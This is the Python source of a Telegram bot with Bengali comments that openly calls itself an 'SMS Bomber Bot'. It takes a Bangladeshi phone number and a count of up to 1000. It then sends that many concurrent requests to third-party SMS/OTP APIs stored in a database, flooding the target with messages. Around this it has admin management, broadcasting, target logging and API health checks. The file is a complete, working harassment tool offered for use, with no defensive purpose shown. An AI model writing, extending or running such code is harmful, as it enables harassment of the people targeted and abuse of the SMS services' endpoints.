# bot.py (চূড়ান্ত সংস্করণ - দ্বি-স্তরীয় অ্যাডমিনসহ)
import os
import requests
import random
import string
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
)
import database

# --- Configuration from Environment Variables ---
OWNER_ID = int(os.environ.get('OWNER_ID'))
LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID'))
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')

# --- Web Server to keep the bot alive ---
app = Flask('')
@app.route('/')
def home():
    return "I am alive!"
def run_flask():
    app.run(host='0.0.0.0', port=8080)

# --- Logging Setup ---
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Helper Functions ---
def random_string_generator(pattern):
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    result = ''
    parts = pattern.split(':')
    main_pattern = parts[0]
    params = parts[1] if len(parts) > 1 else ''
    if main_pattern == '?n*':
        length = int(params)
        return ''.join(random.choice(string.digits) for _ in range(length))
    if main_pattern == '?l*':
        length = int(params)
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    if main_pattern == '?i*':
        length = int(params)
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    return ''
def format_json_template(template_str, number):
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    template_str = template_str.replace("{number}", number)
    template_str = template_str.replace("{number_slice:1}", number[1:])
    while '{random_string:' in template_str:
        start = template_str.find('{random_string:')
        end = template_str.find('}', start)
        pattern = template_str[start+15:end]
        random_val = random_string_generator(pattern)
        template_str = template_str[:start] + random_val + template_str[end+1:]
    return json.loads(template_str)

# --- Bombing Logic ---
def send_dynamic_request(api_details, number):
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    api_id, name, url, method, headers, data_template, is_active = api_details
    if not is_active: return None
    try:
        formatted_data = format_json_template(json.dumps(data_template), number)
        formatted_url = url.replace("{number}", number)
        if method.upper() == "POST":
            response = requests.post(formatted_url, headers=headers, json=formatted_data, timeout=10)
        else:
            response = requests.get(formatted_url, headers=headers, timeout=10)
        logger.info(f"API '{name}' responded with status {response.status_code}")
        return (name, response.status_code)
    except Exception as e:
        logger.error(f"API '{name}' failed: {e}")
        return (name, 'Failed')
def process_requests(number, amount, context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int):
    # ... (এই ফাংশ-টি অপরিবর্তিত) ...
    apis = database.get_all_apis()
    if not apis:
        context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="❌ No APIs found in the database. Please contact the admin.")
        return
    tasks = [random.choice(apis) for _ in range(amount)]
    success_count = 0
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(send_dynamic_request, task, number): i for i, task in enumerate(tasks)}
        for i, future in enumerate(as_completed(futures)):
            result = future.result()
            if result and isinstance(result[1], int) and result[1] < 300:
                success_count += 1
            progress_text = f"⏳ Sending SMS... {i + 1}/{amount}"
            try:
                if (i + 1) % 5 == 0 or (i + 1) == amount:
                    context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=progress_text)
            except Exception as e:
                logger.warning(f"Could not edit message: {e}")
    final_message = f"✅ Bombing Completed.\nSuccessfully sent {success_count}/{amount} requests to {number}."
    context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_message)

# --- Handlers & Conversation States ---
(MAIN_MENU, ADMIN_PANEL, ASK_NUMBER, ASK_AMOUNT, BROADCAST_CONFIRM, ASK_USER_ID, 
 MANAGE_ADMINS, ADD_ADMIN_ID, REMOVE_ADMIN_ID) = range(9)

# --- Keyboards ---
main_keyboard = [["💣 Start Bombing"], ["📊 Statistics"]]
main_markup = ReplyKeyboardMarkup(main_keyboard, resize_keyboard=True)
admin_keyboard = [
    ["📢 Broadcast", "📈 User Stats"],
    ["👥 Manage Admins", "🌡️ API Status"], # "Manage APIs" এর পরিবর্তে "Manage Admins"
    ["⬅️ Back to Main Menu"]
]
admin_markup = ReplyKeyboardMarkup(admin_keyboard, resize_keyboard=True)
manage_admins_keyboard = [
    ["➕ Add Admin", "➖ Remove Admin"],
    ["📋 List Admins", "⬅️ Back to Admin Panel"]
]
manage_admins_markup = ReplyKeyboardMarkup(manage_admins_keyboard, resize_keyboard=True)

# --- Utility Functions ---
def is_owner(update: Update) -> bool:
    """শুধুমাত্র বট মালিক কিনা তা পরীক্ষা করে।"""
    return update.effective_user.id == OWNER_ID

def is_admin(update: Update) -> bool:
    """বট মালিক অথবা ডাটাবেসের অ্যাডমিন কিনা তা পরীক্ষা করে।"""
    user_id = update.effective_user.id
    return user_id == OWNER_ID or database.is_admin_in_db(user_id)

async def send_log_message(context: ContextTypes.DEFAULT_TYPE, user, target_number: str, amount: int):
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    user_link = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
    username = f"(@{user.username})" if user.username else ""
    log_message = (f"<b>🚀 New Bombing Task</b>\n\n"
                   f"👤 <b>User:</b> {user_link} {username}\n"
                   f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
                   f"🎯 <b>Target:</b> <code>{target_number}</code>\n"
                   f"💥 <b>Amount:</b> <code>{amount}</code>")
    try:
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to send log to channel: {e}")

# --- Main Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    user = update.effective_user
    database.add_or_update_user(user.id, user.first_name, user.username)
    credit_text = "This bot is made by <a href='https://t.me/abdur081'>Abdur Rahman</a>."
    await update.message.reply_html(rf"Hi {user.mention_html()}!")
    await update.message.reply_text(
        "Welcome to the SMS Bomber Bot!\n\n"
        f"{credit_text}\n\n"
        "Click a button below to start.",
        reply_markup=main_markup, parse_mode='HTML', disable_web_page_preview=True
    )
    return MAIN_MENU
async def stats_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    total_users, total_tasks = database.get_public_stats()
    message = (f"📊 **Bot Statistics**\n\n"
               f"👥 **Total Unique Users:** {total_users}\n"
               f"💥 **Total Bombing Tasks Initiated:** {total_tasks}")
    await update.message.reply_text(message, parse_mode='HTML', reply_markup=main_markup)

# --- Bombing Conversation ---
async def ask_for_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    await update.message.reply_text("Please enter the target phone number (e.g., 017...):", reply_markup=ReplyKeyboardRemove())
    return ASK_NUMBER
async def ask_for_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    number = update.message.text
    if not (number.startswith("01") and len(number) == 11 and number.isdigit()):
        await update.message.reply_text("❌ Invalid number. Returning to main menu.", reply_markup=main_markup)
        return MAIN_MENU
    context.user_data['number'] = number
    await update.message.reply_text("Now, enter the amount (1-1000):")
    return ASK_AMOUNT
async def start_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    try:
        amount = int(update.message.text)
        if not (1 <= amount <= 1000): raise ValueError
    except (ValueError):
        await update.message.reply_text("❌ Invalid amount (1-1000). Returning to main menu.", reply_markup=main_markup)
        return MAIN_MENU
    number = context.user_data['number']
    user = update.effective_user
    database.add_log(user.id, number, amount)
    await send_log_message(context, user, number, amount)
    progress_message = await update.message.reply_text(f"⏳ Starting SMS Bombing on {number}...", reply_markup=main_markup)
    threading.Thread(
        target=process_requests, 
        args=(number, amount, context, update.message.chat_id, progress_message.message_id)
    ).start()
    return MAIN_MENU

# --- Admin Panel ---
async def admin_panel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_admin(update):
        await update.message.reply_text("You are not authorized to use this command.")
        return MAIN_MENU
    await update.message.reply_text("Welcome to the Admin Panel.", reply_markup=admin_markup)
    return ADMIN_PANEL
async def back_to_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Returning to the main menu.", reply_markup=main_markup)
    return MAIN_MENU

# --- Broadcast Feature ---
async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    await update.message.reply_text("Please send the message you want to broadcast to all users.")
    return BROADCAST_CONFIRM
async def broadcast_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    context.user_data['broadcast_message_id'] = update.message.message_id
    keyboard = [[InlineKeyboardButton("✅ Yes, Send", callback_data='broadcast_send'), InlineKeyboardButton("❌ No, Cancel", callback_data='broadcast_cancel')]]
    await update.message.reply_text("Are you sure you want to send this message to all users?", reply_markup=InlineKeyboardMarkup(keyboard))
    return ADMIN_PANEL
async def broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    query = update.callback_query
    await query.answer()
    if query.data == 'broadcast_send':
        await query.edit_message_text(text="Broadcasting... Please wait.")
        user_ids = database.get_all_user_ids()
        sent_count, failed_count = 0, 0
        for user_id in user_ids:
            try:
                await context.bot.copy_message(chat_id=user_id, from_chat_id=query.message.chat_id, message_id=context.user_data['broadcast_message_id'])
                sent_count += 1
            except Exception:
                failed_count += 1
            time.sleep(0.1)
        await query.edit_message_text(text=f"Broadcast finished.\n\nSent: {sent_count}\nFailed: {failed_count}", reply_markup=admin_markup)
    else:
        await query.edit_message_text(text="Broadcast cancelled.", reply_markup=admin_markup)
    return ADMIN_PANEL

# --- User Stats Feature ---
async def user_stats_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    await update.message.reply_text("Please send the User ID to get their stats.")
    return ASK_USER_ID
async def user_stats_result(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    try:
        user_id = int(update.message.text)
        user_info, task_count = database.get_user_stats(user_id)
        if user_info:
            name, username = user_info
            message = (f"📊 **Stats for User ID:** `{user_id}`\n\n"
                       f"👤 **Name:** {name}\n"
                       f"🌐 **Username:** @{username if username else 'N/A'}\n"
                       f"💥 **Total Tasks:** {task_count}")
            await update.message.reply_text(message, parse_mode='HTML', reply_markup=admin_markup)
        else:
            await update.message.reply_text("User not found in the database.", reply_markup=admin_markup)
    except ValueError:
        await update.message.reply_text("Invalid User ID. Please send a number.", reply_markup=admin_markup)
    return ADMIN_PANEL

# --- API Status Feature ---
async def api_status_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # ... (এই ফাংশনটি অপরিবর্তিত) ...
    apis = database.get_all_apis()
    if not apis:
        await update.message.reply_text("No APIs in the database to check.", reply_markup=admin_markup)
        return ADMIN_PANEL
    msg = await update.message.reply_text("🌡️ Checking API status... Please wait.")
    results = []
    test_number = "01700000000"
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(send_dynamic_request, api, test_number) for api in apis]
        for future in futures:
            results.append(future.result())
    status_text = "<b>🌡️ API Health Status:</b>\n\n"
    for name, status_code in results:
        if isinstance(status_code, int) and status_code < 400:
            status_text += f"✅ {name}: Working (Status: {status_code})\n"
        else:
            status_text += f"❌ {name}: Failed (Status: {status_code})\n"
    await msg.edit_text(status_text, parse_mode='HTML')
    return ADMIN_PANEL

# --- নতুন অ্যাডমিন ম্যানেজমেন্ট ফিচার ---
async def manage_admins_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_owner(update):
        await update.message.reply_text("❌ This feature is only available to the bot owner.")
        return ADMIN_PANEL
    await update.message.reply_text("Manage Admins:", reply_markup=manage_admins_markup)
    return MANAGE_ADMINS

async def add_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Please send the User ID of the new admin.")
    return ADD_ADMIN_ID

async def add_admin_finish(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        user_id = int(update.message.text)
        if database.add_admin(user_id):
            await update.message.reply_text(f"✅ Admin `{user_id}` added successfully.", parse_mode='MarkdownV2')
        else:
            await update.message.reply_text("This user is already an admin.")
    except ValueError:
        await update.message.reply_text("Invalid ID. Please send a number.")
    return MANAGE_ADMINS

async def remove_admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Please send the User ID of the admin to remove.")
    return REMOVE_ADMIN_ID

async def remove_admin_finish(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        user_id = int(update.message.text)
        if user_id == OWNER_ID:
            await update.message.reply_text("❌ You cannot remove the bot owner.")
        elif database.remove_admin(user_id):
            await update.message.reply_text(f"✅ Admin `{user_id}` removed successfully.", parse_mode='MarkdownV2')
        else:
            await update.message.reply_text("This user is not an admin.")
    except ValueError:
        await update.message.reply_text("Invalid ID. Please send a number.")
    return MANAGE_ADMINS

async def list_admins(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    admin_ids = database.get_all_admins()
    message = "<b>👑 Bot Owner:</b>\n"
    try:
        owner_chat = await context.bot.get_chat(OWNER_ID)
        message += f"• {owner_chat.first_name} (@{owner_chat.username}) - <code>{OWNER_ID}</code>\n\n"
    except Exception:
        message += f"• <code>{OWNER_ID}</code>\n\n"
    
    if admin_ids:
        message += "<b>👥 Other Admins:</b>\n"
        for admin_id in admin_ids:
            try:
                admin_chat = await context.bot.get_chat(admin_id)
                message += f"• {admin_chat.first_name} (@{admin_chat.username}) - <code>{admin_id}</code>\n"
            except Exception:
                message += f"• <code>{admin_id}</code>\n"
    else:
        message += "No other admins found."
        
    await update.message.reply_text(message, parse_mode='HTML')
    return MANAGE_ADMINS

# --- General Cancel ---
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Operation cancelled. Returning to main menu.", reply_markup=main_markup)
    context.user_data.clear()
    return MAIN_MENU

# --- Bot Setup ---
async def post_init(application: Application) -> None:
    await application.bot.set_my_commands([
        BotCommand("start", "Restart the bot"),
        BotCommand("stats", "View bot statistics"),
        BotCommand("admin", "Access Admin Panel (Admins only)")
    ])

def main() -> None:
    database.setup_database()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Regex('^💣 Start Bombing$'), ask_for_number),
            MessageHandler(filters.Regex('^📊 Statistics$'), stats_handler),
            CommandHandler("admin", admin_panel_handler),
        ],
        states={
            MAIN_MENU: [
                MessageHandler(filters.Regex('^💣 Start Bombing$'), ask_for_number),
                MessageHandler(filters.Regex('^📊 Statistics$'), stats_handler),
                CommandHandler("admin", admin_panel_handler)
            ],
            ASK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_for_amount)],
            ASK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, start_bombing)],
            ADMIN_PANEL: [
                MessageHandler(filters.Regex('^📢 Broadcast$'), broadcast_start),
                MessageHandler(filters.Regex('^📈 User Stats$'), user_stats_start),
                MessageHandler(filters.Regex('^🌡️ API Status$'), api_status_check),
                MessageHandler(filters.Regex('^👥 Manage Admins$'), manage_admins_start),
                MessageHandler(filters.Regex('^⬅️ Back to Main Menu$'), back_to_main_menu),
                CallbackQueryHandler(broadcast_callback)
            ],
            BROADCAST_CONFIRM: [MessageHandler(filters.ALL & ~filters.COMMAND, broadcast_confirm)],
            ASK_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, user_stats_result)],
            MANAGE_ADMINS: [
                MessageHandler(filters.Regex('^➕ Add Admin$'), add_admin_start),
                MessageHandler(filters.Regex('^➖ Remove Admin$'), remove_admin_start),
                MessageHandler(filters.Regex('^📋 List Admins$'), list_admins),
                MessageHandler(filters.Regex('^⬅️ Back to Admin Panel$'), admin_panel_handler),
            ],
            ADD_ADMIN_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_admin_finish)],
            REMOVE_ADMIN_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_admin_finish)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    application.add_handler(conv_handler)
    application.run_polling()

if __name__ == "__main__":
    # Replit-এর জন্য ওয়েব সার্ভারটি একটি আলাদা থ্রেডে চালু করা হচ্ছে
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    main()
